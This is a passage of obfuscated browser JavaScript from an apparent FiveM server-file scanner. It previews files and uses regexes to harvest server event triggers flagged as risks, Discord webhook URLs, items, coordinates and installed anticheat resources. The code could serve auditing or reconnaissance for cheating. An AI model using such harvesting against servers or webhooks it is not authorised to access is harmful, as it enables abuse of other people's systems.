        _0xe6b650.innerHTML = "\n                    <div class=\"folder-header\" style=\"display: flex; align-items: center; padding: 6px 8px; cursor: pointer; border-radius: 4px; transition: background-color 0.2s;\">\n                        <i class=\"fas fa-chevron-right folder-icon\" style=\"margin-right: 8px; font-size: 12px; transition: transform 0.2s; color: #8b9dc3; width: 12px; text-align: center;\"></i>\n                        <i class=\"fas fa-folder\" style=\"margin-right: 8px; color: #f39c12; font-size: 14px;\"></i>\n                        <span style=\"flex: 1; color: #ffffff; font-weight: 500;\">" + _0x16dcc9 + "</span>\n                        <span style=\"font-size: 11px; color: #8b9dc3; margin-left: 8px;\">" + _0x460f0c + " files</span>\n                    </div>\n                    <div class=\"folder-content\" style=\"display: none; margin-left: 20px; border-left: 1px solid rgba(139, 157, 195, 0.2); padding-left: 10px;\">\n                    </div>\n                ";
        const _0x1de5f3 = _0xe6b650.querySelector(".folder-header");
        const _0x154370 = _0xe6b650.querySelector(".folder-content");
        const _0x28fc62 = _0xe6b650.querySelector('.folder-icon');
        _0x1de5f3.addEventListener("click", () => {
          const _0x52691d = _0x154370.style.display !== "none";
          if (_0x52691d) {
            _0x154370.style.display = 'none';
            _0x28fc62.style.transform = "rotate(0deg)";
            _0x1de5f3.style.backgroundColor = "transparent";
          } else {
            _0x154370.style.display = "block";
            _0x28fc62.style.transform = "rotate(90deg)";
            _0x1de5f3.style.backgroundColor = "rgba(139, 157, 195, 0.1)";
            if (_0x154370.children.length === 0x0) {
              renderFolderTree(_0x154370, _0x2c4ae3.children, _0x44cea8, _0x3405d9);
            }
          }
        });
        if (_0x3405d9 && _0x460f0c > 0x0) {
          _0x154370.style.display = 'block';
          _0x28fc62.style.transform = "rotate(90deg)";
          _0x1de5f3.style.backgroundColor = "rgba(139, 157, 195, 0.1)";
          renderFolderTree(_0x154370, _0x2c4ae3.children, _0x44cea8, _0x3405d9);
        }
        _0x1de5f3.addEventListener('mouseenter', () => {
          if (_0x154370.style.display === "none") {
            _0x1de5f3.style.backgroundColor = "rgba(139, 157, 195, 0.05)";
          }
        });
        _0x1de5f3.addEventListener("mouseleave", () => {
          if (_0x154370.style.display === "none") {
            _0x1de5f3.style.backgroundColor = 'transparent';
          }
        });
        _0x5c1d56.appendChild(_0xe6b650);
      } else {
        if (_0x2c4ae3.type === 'file') {
          if (_0x3405d9) {
            const _0x8a786a = _0x2c4ae3.file.name.toLowerCase();
            const _0x3d883b = (_0x2c4ae3.file.webkitRelativePath || "web_upload/" + _0x2c4ae3.file.name).toLowerCase();
            if (!_0x8a786a.includes(_0x3405d9) && !_0x3d883b.includes(_0x3405d9)) {
              return;
            }
          }
          const _0x4f5c7e = document.createElement("div");
          _0x4f5c7e.className = "resource-file";
          _0x4f5c7e.style.cssText = "\n                    display: flex;\n                    align-items: center;\n                    padding: 4px 8px;\n                    margin: 2px 0;\n                    cursor: pointer;\n                    border-radius: 4px;\n                    transition: background-color 0.2s;\n                    margin-left: 20px;\n                    font-size: 13px;\n                ";
          const _0x2fd4ef = getFileIcon(_0x16dcc9);
          _0x4f5c7e.innerHTML = "\n                    <i class=\"" + _0x2fd4ef + "\" style=\"margin-right: 8px; color: #667eea; font-size: 12px; width: 12px; text-align: center;\"></i>\n                    <span style=\"flex: 1; color: #ffffff; font-size: 13px;\">" + _0x16dcc9 + "</span>\n                    <span style=\"font-size: 11px; color: #8b9dc3;\">" + formatFileSize(_0x2c4ae3.file.size) + "</span>\n                    <button class=\"view-file-btn\" style=\"margin-left: 8px; padding: 2px 6px; background: #667eea; color: white; border: none; border-radius: 3px; cursor: pointer; font-size: 10px; opacity: 0; transition: opacity 0.2s;\">\n                        <i class=\"fas fa-eye\"></i>\n                    </button>\n                ";
          _0x4f5c7e.addEventListener("click", () => {
            viewFile(_0x2c4ae3.file);
          });
          _0x4f5c7e.addEventListener("mouseenter", () => {
            const _0xc5457d = _0x4f5c7e.querySelector(".view-file-btn");
            if (_0xc5457d) {
              _0xc5457d.style.opacity = '1';
            }
          });
          _0x4f5c7e.addEventListener("mouseleave", () => {
            const _0x4243aa = _0x4f5c7e.querySelector(".view-file-btn");
            if (_0x4243aa) {
              _0x4243aa.style.opacity = '0';
            }
          });
          _0x4f5c7e.addEventListener("mouseenter", () => {
            _0x4f5c7e.style.backgroundColor = "rgba(139, 157, 195, 0.1)";
          });
          _0x4f5c7e.addEventListener("mouseleave", () => {
            _0x4f5c7e.style.backgroundColor = "transparent";
          });
          _0x5c1d56.appendChild(_0x4f5c7e);
        }
      }
    });
  } catch (_0x2c57ed) {
    console.error("Error rendering folder tree:", _0x2c57ed);
  }
}
function countFilesInFolder(_0x39b868) {
  try {
    let _0x196163 = 0x0;
    Object.keys(_0x39b868.children).forEach(_0x4ab6eb => {
      const _0x3ad5a4 = _0x39b868.children[_0x4ab6eb];
      if (_0x3ad5a4.type === "file") {
        _0x196163++;
      } else if (_0x3ad5a4.type === "folder") {
        _0x196163 += countFilesInFolder(_0x3ad5a4);
      }
    });
    return _0x196163;
  } catch (_0x2c97f4) {
    console.error("Error counting files in folder:", _0x2c97f4);
    return 0x0;
  }
}
function getFileIcon(_0x10a815) {
  try {
    const _0x8d01da = _0x10a815.toLowerCase().substring(_0x10a815.lastIndexOf('.'));
    switch (_0x8d01da) {
      case ".lua":
        return "fas fa-code";
      case '.js':
        return "fab fa-js-square";
      case '.json':
        return "fas fa-file-code";
      case '.html':
        return "fab fa-html5";
      case '.css':
        return "fab fa-css3-alt";
      case ".xml":
        return "fas fa-file-code";
      case ".txt":
        return "fas fa-file-alt";
      case '.md':
        return "fas fa-file-alt";
      case ".png":
      case ".jpg":
      case ".jpeg":
      case ".gif":
      case ".webp":
      case '.svg':
        return "fas fa-image";
      case ".cfg":
        return "fas fa-cog";
      case ".php":
        return "fab fa-php";
      case ".py":
        return "fab fa-python";
      default:
        return "fas fa-file";
    }
  } catch (_0x4f97bd) {
    console.error("Error getting file icon:", _0x4f97bd);
    return "fas fa-file";
  }
}
function formatFileSize(_0x26a835) {
  try {
    if (_0x26a835 === 0x0) {
      return "0 B";
    }
    const _0xabba = ['B', 'KB', 'MB', 'GB'];
    const _0x461187 = Math.floor(Math.log(_0x26a835) / Math.log(0x400));
    return parseFloat((_0x26a835 / Math.pow(0x400, _0x461187)).toFixed(0x1)) + " " + _0xabba[_0x461187];
  } catch (_0x5c8cae) {
    console.error("Error formatting file size:", _0x5c8cae);
    return "0 B";
  }
}
function viewFile(_0x4c61a4) {
  const _0x1f9cc0 = document.getElementById("file-viewer-modal");
  const _0xa65e3b = document.getElementById("file-viewer-name");
  const _0x40fbab = document.getElementById('file-viewer-text');
  const _0x2f1c89 = document.getElementById("file-viewer-close");
  const _0x4df528 = document.getElementById("file-viewer-overlay");
  _0x1f9cc0.style.display = "flex";
  _0xa65e3b.textContent = "File Preview: " + _0x4c61a4.name;
  _0x40fbab.innerHTML = "<code>Loading file content...</code>";
  const _0x7a15bc = new FileReader();
  _0x7a15bc.onload = function (_0xe02976) {
    try {
      const _0x2562c9 = _0xe02976.target.result;
      if (isTextFile(_0x4c61a4.name)) {
        let _0x326ec7 = _0x2562c9;
        if (_0x2562c9.length > 0x186a0) {
          _0x326ec7 = _0x2562c9.substring(0x0, 0x186a0) + "\n\n... (File truncated - too large to display completely)";
        }
        const _0x5c9ff3 = applySyntaxHighlighting(_0x326ec7, _0x4c61a4.name);
        _0x40fbab.innerHTML = '<code>' + _0x5c9ff3 + "</code>";
        setupFileViewerSearch(_0x1f9cc0);
      } else {
        _0x40fbab.innerHTML = "<code>Binary file - content not displayed\n\nFile type: " + _0x4c61a4.type + "\nSize: " + (_0x4c61a4.size / 0x400).toFixed(0x2) + " KB</code>";
      }
    } catch (_0x4d57d1) {
      _0x40fbab.innerHTML = "<code>Error reading file content: " + _0x4d57d1.message + "</code>";
      console.error("Error reading file:", _0x4d57d1);
    }
  };
  _0x7a15bc.onerror = function () {
    _0x40fbab.innerHTML = "<code>Error reading file. Please try again.</code>";
  };
  if (isTextFile(_0x4c61a4.name)) {
    _0x7a15bc.readAsText(_0x4c61a4);
  } else {
    _0x40fbab.innerHTML = "<code>Binary file - content not displayed\n\nFile type: " + _0x4c61a4.type + "\nSize: " + (_0x4c61a4.size / 0x400).toFixed(0x2) + " KB</code>";
  }
  const _0x1fc7bd = () => {
    _0x1f9cc0.style.display = "none";
  };
  _0x2f1c89.onclick = _0x1fc7bd;
  _0x4df528.onclick = _0x1fc7bd;
  const _0x2f1164 = _0x479c17 => {
    if (_0x479c17.key === 'Escape') {
      _0x1fc7bd();
      document.removeEventListener("keydown", _0x2f1164);
    }
  };
  document.addEventListener("keydown", _0x2f1164);
  showNotification("File opened: " + _0x4c61a4.name, "info");
}
function applySyntaxHighlighting(_0x29b3e6, _0x4f6710) {
  try {
    const _0x43baa5 = _0x4f6710.toLowerCase().substring(_0x4f6710.lastIndexOf('.'));
    switch (_0x43baa5) {
      case ".xml":
      case ".meta":
        return highlightXML(_0x29b3e6);
      case ".lua":
        return highlightLua(_0x29b3e6);
      case '.js':
        return highlightJavaScript(_0x29b3e6);
      case ".json":
        return highlightJSON(_0x29b3e6);
      case ".html":
        return highlightHTML(_0x29b3e6);
      case ".css":
        return highlightCSS(_0x29b3e6);
      case '.php':
        return highlightPHP(_0x29b3e6);
      case ".py":
        return highlightPython(_0x29b3e6);
      default:
        return escapeHtml(_0x29b3e6);
    }
  } catch (_0x1d212b) {
    console.error("Error applying syntax highlighting:", _0x1d212b);
    return escapeHtml(_0x29b3e6);
  }
}
function highlightXML(_0x4d7ecf) {
  return _0x4d7ecf.replace(/&/g, "&amp;").replace(/</g, '&lt;').replace(/>/g, "&gt;").replace(/(".*?")/g, "<span class=\"xml-attr\">$1</span>").replace(/(&lt;\/?[a-zA-Z][a-zA-Z0-9]*)/g, "<span class=\"xml-tag\">$1</span>").replace(/(&gt;)/g, "<span class=\"xml-tag\">$1</span>").replace(/(&lt;!--.*?--&gt;)/g, "<span class=\"xml-comment\">$1</span>").replace(/(&gt;)([^&]*?)(&lt;)/g, function (_0x4130ee, _0x404bd5, _0x580a3e, _0x46be23) {
    return _0x404bd5 + "<span class=\"xml-value\">" + _0x580a3e + "</span>" + _0x46be23;
  });
}
function highlightLua(_0x5634f9) {
  const _0xf4efb5 = ["function", "end", 'if', "then", "else", "elseif", "for", 'while', 'do', "repeat", "until", "break", "return", "local", "nil", 'true', "false", "and", 'or', "not", 'in'];
  const _0x42d206 = new RegExp("\\b(" + _0xf4efb5.join('|') + ")\\b", 'g');
  return _0x5634f9.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(_0x42d206, "<span class=\"lua-keyword\">$1</span>").replace(/(--.*)/g, "<span class=\"lua-comment\">$1</span>").replace(/(\d+\.?\d*)/g, "<span class=\"lua-number\">$1</span>").replace(/(["'])((?:\\.|(?!\1)[^\\])*?)\1/g, "<span class=\"lua-string\">$1$2$1</span>");
}
function highlightJavaScript(_0x44d1de) {
  const _0x4e6fa5 = ['function', 'var', "let", 'const', 'if', "else", "for", "while", 'do', "switch", "case", 'break', "continue", 'return', 'try', "catch", 'finally', "throw", 'new', "delete", "typeof", "instanceof", 'in', 'of', "class", "extends", 'super', "import", "export", "default", "async", 'await', 'true', 'false', "null", "undefined"];
  const _0x388fe4 = new RegExp("\\b(" + _0x4e6fa5.join('|') + ")\\b", 'g');
  return _0x44d1de.replace(/&/g, "&amp;").replace(/</g, '&lt;').replace(/>/g, "&gt;").replace(_0x388fe4, "<span class=\"js-keyword\">$1</span>").replace(/(\/\/.*)/g, "<span class=\"js-comment\">$1</span>").replace(/(\/\*[\s\S]*?\*\/)/g, "<span class=\"js-comment\">$1</span>").replace(/(\d+\.?\d*)/g, "<span class=\"js-number\">$1</span>").replace(/(["'`])((?:\\.|(?!\1)[^\\])*?)\1/g, "<span class=\"js-string\">$1$2$1</span>");
}
function highlightJSON(_0x3a5be8) {
  return _0x3a5be8.replace(/&/g, "&amp;").replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/(["'])((?:\\.|(?!\1)[^\\])*?)\1/g, "<span class=\"js-string\">$1$2$1</span>").replace(/(\d+\.?\d*)/g, "<span class=\"js-number\">$1</span>").replace(/\b(true|false|null)\b/g, "<span class=\"js-keyword\">$1</span>");
}
function highlightHTML(_0x591f6d) {
  return _0x591f6d.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/(&lt;\/?[a-zA-Z][a-zA-Z0-9]*)/g, "<span class=\"xml-tag\">$1</span>").replace(/(&gt;)/g, "<span class=\"xml-tag\">$1</span>").replace(/(".*?")/g, "<span class=\"xml-attr\">$1</span>").replace(/(&lt;!--.*?--&gt;)/g, "<span class=\"xml-comment\">$1</span>");
}
function highlightCSS(_0x72f6f0) {
  const _0x1094db = ["@media", '@import', "@font-face", "@keyframes", '@supports', '!important'];
  const _0x4ec5c0 = new RegExp("\\b(" + _0x1094db.join('|') + ")\\b", 'g');
  return _0x72f6f0.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(_0x4ec5c0, "<span class=\"js-keyword\">$1</span>").replace(/(\/\*[\s\S]*?\*\/)/g, "<span class=\"js-comment\">$1</span>").replace(/(\d+\.?\d*)/g, "<span class=\"js-number\">$1</span>").replace(/(["'])((?:\\.|(?!\1)[^\\])*?)\1/g, "<span class=\"js-string\">$1$2$1</span>");
}
function highlightPHP(_0x5c1c96) {
  const _0x19a405 = ['function', "class", "public", "private", 'protected', 'static', 'const', 'if', 'else', "elseif", "for", "foreach", 'while', 'do', 'switch', "case", "break", "continue", "return", "try", "catch", 'finally', "throw", 'new', "clone", "var", "global", "isset", 'unset', "empty", "die", "exit", "true", "false", "null", 'array', "string", "int", "float", 'bool', "object", "mixed", "void"];
  const _0x5b4eb4 = new RegExp("\\b(" + _0x19a405.join('|') + ")\\b", 'g');
  return _0x5c1c96.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/(&lt;\?php|\?&gt;)/g, "<span class=\"js-keyword\">$1</span>").replace(_0x5b4eb4, "<span class=\"js-keyword\">$1</span>").replace(/(\/\/.*)/g, "<span class=\"js-comment\">$1</span>").replace(/(\/\*[\s\S]*?\*\/)/g, "<span class=\"js-comment\">$1</span>").replace(/(\d+\.?\d*)/g, "<span class=\"js-number\">$1</span>").replace(/(["'])((?:\\.|(?!\1)[^\\])*?)\1/g, "<span class=\"js-string\">$1$2$1</span>");
}
function highlightPython(_0x38332c) {
  const _0xaa72c5 = ['def', "class", 'if', "elif", "else", "for", "while", "try", 'except', "finally", "with", 'as', "import", "from", "return", "yield", "break", "continue", 'pass', "raise", "assert", "True", "False", "None", 'and', 'or', 'not', 'in', 'is', "lambda", "global", 'nonlocal'];
  const _0x3bf29d = new RegExp("\\b(" + _0xaa72c5.join('|') + ")\\b", 'g');
  return _0x38332c.replace(/&/g, "&amp;").replace(/</g, '&lt;').replace(/>/g, "&gt;").replace(_0x3bf29d, "<span class=\"js-keyword\">$1</span>").replace(/(#.*)/g, "<span class=\"js-comment\">$1</span>").replace(/(\d+\.?\d*)/g, "<span class=\"js-number\">$1</span>").replace(/(["'`])((?:\\.|(?!\1)[^\\])*?)\1/g, "<span class=\"js-string\">$1$2$1</span>");
}
function escapeHtml(_0x33cbff) {
  return _0x33cbff.replace(/&/g, '&amp;').replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, '&quot;').replace(/'/g, "&#039;");
}
function performDeepScan() {
  if (true || appState.selectedFiles.length === 0x0) {
    showNotification("Please select a server directory first", 'error');
    return;
  }
  showNotification("Starting deep scan...", "info");
  scanAllFiles();
}
function scanAllFiles() {
  try {
    const _0x400094 = appState.selectedFiles;
    let _0x231a9d = 0x0;
    const _0x3d043e = _0x400094.length;
    const _0x1b3073 = [];
    const _0x2ebaac = [];
    const _0x4bde4f = [];
    const _0x17552d = [];
    const _0x25227a = [];
    const _0x5078da = [];
    const _0x35ea91 = new Map();
    const _0x290a4c = new Map();
    _0x400094.forEach(_0x2c2163 => {
      try {
        const _0x29a55e = new FileReader();
        _0x29a55e.onload = function (_0x38375d) {
          try {
            const _0x5d2c8a = _0x38375d.target.result;
            const _0x28e49c = _0x2c2163.webkitRelativePath || "web_upload/" + _0x2c2163.name;
            if (isTextFile(_0x28e49c)) {
              const _0x231c42 = scanFileForTriggers(_0x5d2c8a, _0x28e49c);
              _0x1b3073.push(..._0x231c42);
              const _0x25d066 = scanFileForWebhooks(_0x5d2c8a, _0x28e49c);
              _0x2ebaac.push(..._0x25d066);
              const _0x510a9c = scanFileForItems(_0x5d2c8a, _0x28e49c);
              _0x4bde4f.push(..._0x510a9c);
              const _0x14d031 = scanFileForCoordinates(_0x5d2c8a, _0x28e49c);
              _0x17552d.push(..._0x14d031);
              if (_0x28e49c.includes("fxmanifest.lua")) {
                const _0xa9549b = scanFileForAnticheat(_0x5d2c8a, _0x28e49c);
                if (_0xa9549b) {
                  _0x25227a.push(_0xa9549b);
                  const _0x2e7495 = getResourceNameFromPath(_0x28e49c);
                  if (_0x2e7495) {
                    _0x290a4c.set(_0x2e7495, {
                      'name': _0xa9549b,
                      'file': _0x28e49c,
                      'resource': _0x2e7495
                    });
                  }
                }
                const _0x401107 = scanFileForLogs(_0x5d2c8a, _0x28e49c);
                if (_0x401107) {
                  _0x5078da.push(_0x401107);
                }
              }
            } else if (isImageFile(_0x28e49c)) {
              processImageFile(_0x2c2163, _0x35ea91);
            }
            _0x231a9d++;
            if (_0x231a9d === _0x3d043e) {
              const _0x9df7bd = removeDuplicateTriggers(_0x1b3073);
              const _0x5e841f = removeDuplicateWebhooks(_0x2ebaac);
              const _0x1549d6 = removeDuplicateItems(_0x4bde4f);
              const _0x68a050 = removeDuplicateCoordinates(_0x17552d);
              const _0x57c136 = attachImagesToItems(_0x1549d6, _0x35ea91);
              appState.scanResults.triggers = _0x9df7bd;
              appState.scanResults.webhooks = _0x5e841f;
              appState.scanResults.items = _0x57c136;
              appState.scanResults.coordinates = _0x68a050;
              appState.scanResults.files = _0x3d043e;
              appState.scanResults.anticheats = Array.from(_0x290a4c.values());
              updateTriggersTable(_0x9df7bd);
              updateWebhooksTable(_0x5e841f);
              updateSelectedWebhooksList();
              updateItemsTable(_0x57c136);
              updateCoordinatesTable(_0x68a050);
              updateAnticheatFromScan(_0x25227a);
              updateLogsFromScan(_0x5078da);
              updateStats();
              updateResourceExplorerWithAnticheats();
              showNotification("Deep scan completed! Found " + _0x9df7bd.length + " triggers, " + _0x5e841f.length + " webhooks, " + _0x57c136.length + " items, " + _0x68a050.length + " coordinates", "success");
            }
          } catch (_0x516a7f) {
            console.error("Error processing file content:", _0x516a7f);
            _0x231a9d++;
            if (_0x231a9d === _0x3d043e) {
              showNotification("Scan completed with some errors", "warning");
            }
          }
        };
        _0x29a55e.onerror = function () {
          console.error("Error reading file:", _0x2c2163.name);
          _0x231a9d++;
          if (_0x231a9d === _0x3d043e) {
            showNotification("Scan completed with some errors", "warning");
          }
        };
        _0x29a55e.readAsText(_0x2c2163);
      } catch (_0x1d6499) {
        console.error("Error setting up file reader:", _0x1d6499);
        _0x231a9d++;
        if (_0x231a9d === _0x3d043e) {
          showNotification("Scan completed with some errors", "warning");
        }
      }
    });
  } catch (_0x2a80cc) {
    console.error("Error in scanAllFiles:", _0x2a80cc);
    showNotification("Error during scan", "error");
  }
}
function isTextFile(_0x1724ee) {
  const _0x3ee845 = [".lua", ".js", ".json", ".cfg", '.txt', ".xml", '.html', '.css', ".php", ".py", '.md'];
  const _0x2fa030 = _0x1724ee.toLowerCase().substring(_0x1724ee.lastIndexOf('.'));
  return _0x3ee845.includes(_0x2fa030);
}
function isImageFile(_0x3e8044) {
  const _0x170b95 = ['.png', ".jpg", ".jpeg", ".gif", ".webp", ".svg"];
  const _0x48ddf1 = _0x3e8044.toLowerCase().substring(_0x3e8044.lastIndexOf('.'));
  return _0x170b95.includes(_0x48ddf1);
}
function processImageFile(_0x4d17a4, _0x3943de) {
  try {
    const _0x209ba7 = _0x4d17a4.webkitRelativePath || "web_upload/" + _0x4d17a4.name;
    if (_0x209ba7.includes("ox_inventory") && _0x209ba7.includes('images')) {
      const _0x1d5367 = _0x209ba7.split('/');
      const _0x2d10af = _0x1d5367[_0x1d5367.length - 0x1];
      const _0x28f4f0 = _0x2d10af.substring(0x0, _0x2d10af.lastIndexOf('.'));
      const _0x302c3e = new FileReader();
      _0x302c3e.onload = function (_0x5503cc) {
        try {
          const _0x3f8501 = new Blob([_0x5503cc.target.result], {
            'type': _0x4d17a4.type
          });
          const _0x2ac525 = URL.createObjectURL(_0x3f8501);
          _0x3943de.set(_0x28f4f0.toLowerCase(), _0x2ac525);
        } catch (_0x47698c) {
          console.error("Error creating blob URL for image:", _0x47698c);
        }
      };
      _0x302c3e.readAsArrayBuffer(_0x4d17a4);
    }
  } catch (_0x3785d8) {
    console.error("Error processing image file:", _0x3785d8);
  }
}
function getResourceName(_0x41f690, _0x139ab9) {
  try {
    const _0x384ede = _0x41f690.split('/');
    const _0x599474 = _0x384ede[0x0];
    if (_0x41f690.includes('fxmanifest.lua') || _0x41f690.includes('__resource.lua')) {
      if (_0x139ab9.includes("fx_version") || _0x139ab9.includes("resource_manifest_version")) {
        const _0x3184ad = _0x139ab9.match(/--\s*Resource:\s*([^\n]+)/i) || _0x139ab9.match(/resource_name\s*=\s*["']([^"']+)["']/i) || _0x139ab9.match(/name\s*=\s*["']([^"']+)["']/i);
        if (_0x3184ad) {
          return _0x3184ad[0x1].trim();
        }
      }
    }
    if (_0x41f690.includes("items.lua") || _0x41f690.includes("weapons.lua")) {
      const _0x31cfb4 = _0x41f690.split('/');
      if (_0x31cfb4.length >= 0x2) {
        return _0x31cfb4[0x0];
      }
    }
    const _0x1da61d = _0x41f690.split('/');
    if (_0x1da61d.length >= 0x2) {
      return _0x1da61d[0x1];
    }
    return _0x599474;
  } catch (_0x52b040) {
    console.error("Error getting resource name:", _0x52b040);
    return _0x41f690.split('/')[0x0];
  }
}
function getResourceNameFromPath(_0x115cbe) {
  try {
    const _0x213ac6 = _0x115cbe.split('/');
    if (_0x213ac6.length >= 0x2) {
      return _0x213ac6[_0x213ac6.length - 0x2];
    }
    return null;
  } catch (_0x52406e) {
    console.error("Error getting resource name from path:", _0x52406e);
    return null;
  }
}
function scanFileForTriggers(_0x5bbb21, _0x1af044) {
  try {
    const _0x298160 = [];
    const _0x58ffdd = getResourceName(_0x1af044, _0x5bbb21);
    const _0x2c649f = [/TriggerEvent\s*\(\s*["']([^"']+)["']/g, /TriggerServerEvent\s*\(\s*["']([^"']+)["']/g, /TriggerClientEvent\s*\(\s*["']([^"']+)["']/g];
    _0x2c649f.forEach(_0x3c4ced => {
      let _0x434225;
      while ((_0x434225 = _0x3c4ced.exec(_0x5bbb21)) !== null) {
        try {
          const _0x3f6ee7 = getLineNumber(_0x5bbb21, _0x434225.index);
          const _0x1f49e7 = _0x5bbb21.split("\n");
          const _0x2c6825 = _0x1f49e7[_0x3f6ee7 - 0x1] || _0x434225[0x0];
          _0x298160.push({
            'resource': _0x58ffdd,
            'usage': _0x2c6825.trim(),
            'status': "Active",
            'risk': 'Potential',
            'file': _0x1af044,
            'line': _0x3f6ee7
          });
        } catch (_0x34e9a0) {
          console.error("Error processing trigger match:", _0x34e9a0);
        }
      }
    });
    return _0x298160;
  } catch (_0x4dc5bb) {
    console.error("Error scanning file for triggers:", _0x4dc5bb);
    return [];
  }
}
function scanFileForWebhooks(_0x125729, _0x42bc12) {
  try {
    const _0x1b2efe = [];
    const _0x314025 = getResourceName(_0x42bc12, _0x125729);
    const _0x3d7dd1 = [/https:\/\/discord\.com\/api\/webhooks\/[^\s"']+/g, /https:\/\/discordapp\.com\/api\/webhooks\/[^\s"']+/g, /webhook.*=.*["'](https:\/\/[^"']+)["']/g, /["'](https:\/\/discord\.com\/api\/webhooks\/[^"']+)["']/g];
    _0x3d7dd1.forEach(_0x48c865 => {
      let _0x4e8b16;
      while ((_0x4e8b16 = _0x48c865.exec(_0x125729)) !== null) {
        try {
          const _0x270122 = _0x4e8b16[0x1] || _0x4e8b16[0x0];
          const _0x861d6f = getLineNumber(_0x125729, _0x4e8b16.index);
          _0x1b2efe.push({
            'resource': _0x314025,
            'url': _0x270122,
            'status': "Active",
            'file': _0x42bc12,
            'line': _0x861d6f
          });
        } catch (_0x494ed8) {
          console.error("Error processing webhook match:", _0x494ed8);
        }
      }
    });
    return _0x1b2efe;
  } catch (_0x19f7ed) {
    console.error("Error scanning file for webhooks:", _0x19f7ed);
    return [];
  }
}
function scanFileForItems(_0x1b7101, _0x411730) {
  try {
    const _0x5215fe = [];
    const _0x1bc88a = getResourceName(_0x411730, _0x1b7101);
    if (_0x411730.includes("items.lua") || _0x411730.includes("weapons.lua")) {
      const _0x419df4 = _0x1b7101.split("\n");
      let _0x31a734 = null;
      let _0x51ce4c = 0x0;
      for (let _0x5805b4 = 0x0; _0x5805b4 < _0x419df4.length; _0x5805b4++) {
        try {
          const _0x485df9 = _0x419df4[_0x5805b4];
          const _0x514924 = _0x485df9.match(/\[["']([^"']+)["']\]\s*=\s*{/);
          if (_0x514924) {
            _0x31a734 = {
              'name': _0x514924[0x1],
              'label': '',
              'type': "item",
              'weight': 0x0,
              'file': _0x411730,
              'line': _0x5805b4 + 0x1,
              'resource': _0x1bc88a
            };
            _0x51ce4c = 0x1;
            continue;
          }
          if (_0x31a734) {
            const _0x52ee69 = _0x485df9.match(/label\s*=\s*["']([^"']+)["']/);
            if (_0x52ee69) {
              _0x31a734.label = _0x52ee69[0x1];
            }
            const _0x2b770c = _0x485df9.match(/weight\s*=\s*([0-9.]+)/);
            if (_0x2b770c) {
              _0x31a734.weight = parseFloat(_0x2b770c[0x1]);
            }
            const _0x6fc577 = (_0x485df9.match(/{/g) || []).length;
            const _0xa4e6e1 = (_0x485df9.match(/}/g) || []).length;
            _0x51ce4c += _0x6fc577 - _0xa4e6e1;
            if (_0x51ce4c <= 0x0 && _0x31a734.name && _0x31a734.label) {
              _0x5215fe.push(_0x31a734);
              _0x31a734 = null;
              _0x51ce4c = 0x0;
            }
          }
        } catch (_0xb5d625) {
          console.error("Error processing line:", _0xb5d625);
        }
      }
      const _0x32a382 = /\[["']([^"']+)["']\]\s*=\s*["']([^"']+)["']/g;
      let _0x14b83b;
      while ((_0x14b83b = _0x32a382.exec(_0x1b7101)) !== null) {
        const _0x26fc52 = _0x14b83b[0x1];
        const _0xe2f936 = _0x14b83b[0x2];
        const _0x46bf2f = getLineNumber(_0x1b7101, _0x14b83b.index);
        const _0x31a779 = _0x5215fe.find(_0x1cf6d0 => _0x1cf6d0.name === _0x26fc52);
        if (!_0x31a779) {
          _0x5215fe.push({
            'name': _0x26fc52,
            'label': _0xe2f936,
            'type': "item",
            'weight': 0x0,
            'file': _0x411730,
            'line': _0x46bf2f,
            'resource': _0x1bc88a
          });
        }
      }
    }
    return _0x5215fe;
  } catch (_0xe938cd) {
    console.error("Error scanning file for items:", _0xe938cd);
    return [];
  }
}
function scanFileForCoordinates(_0x16292c, _0x2d4d27) {
  try {
    const _0x31328a = [];
    const _0x4ba926 = getResourceName(_0x2d4d27, _0x16292c);
    const _0x5e2efc = document.getElementById("find-next-to-items-checkbox")?.["checked"] || false;
    const _0x43adf3 = document.getElementById("find-vec3-checkbox")?.["checked"] || true;
    const _0x52bc68 = document.getElementById('find-vec4-checkbox')?.["checked"] || true;
    const _0x3f2361 = scanFileForItems(_0x16292c, _0x2d4d27);
    const _0x2ae4f7 = _0x3f2361.map(_0x1d4d9d => _0x1d4d9d.name.toLowerCase());
    const _0x3f0401 = _0x16292c.split("\n");
    for (let _0x13d9e3 = 0x0; _0x13d9e3 < _0x3f0401.length; _0x13d9e3++) {
      try {
        const _0x5d0c06 = _0x3f0401[_0x13d9e3];
        if (_0x43adf3) {
          const _0x3f03a9 = [/vec3\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g, /vector3\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g, /Vector3\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g];
          _0x3f03a9.forEach(_0x577b66 => {
            let _0x215796;
            while ((_0x215796 = _0x577b66.exec(_0x5d0c06)) !== null) {
              const _0xaced1c = parseFloat(_0x215796[0x1]);
              const _0x507245 = parseFloat(_0x215796[0x2]);
              const _0x13071a = parseFloat(_0x215796[0x3]);
              let _0x32cb44 = null;
              if (_0x5e2efc) {
                const _0x11d3bd = Math.max(0x0, _0x13d9e3 - 0xa);
                const _0x5d6241 = Math.min(_0x3f0401.length, _0x13d9e3 + 0xa);
                const _0x4603a7 = _0x3f0401.slice(_0x11d3bd, _0x5d6241).join(" ").toLowerCase();
                for (const _0x22f18d of _0x2ae4f7) {
                  if (_0x4603a7.includes(_0x22f18d)) {
                    _0x32cb44 = _0x22f18d;
                    break;
                  }
                }
              }
              _0x31328a.push({
                'type': "vec3",
                'x': _0xaced1c,
                'y': _0x507245,
                'z': _0x13071a,
                'w': null,
                'coordinates': "vec3(" + _0xaced1c + ", " + _0x507245 + ", " + _0x13071a + ')',
                'resource': _0x4ba926,
                'file': _0x2d4d27,
                'line': _0x13d9e3 + 0x1,
                'nearItem': _0x32cb44,
                'fullLine': _0x5d0c06.trim()
              });
            }
          });
        }
        if (_0x52bc68) {
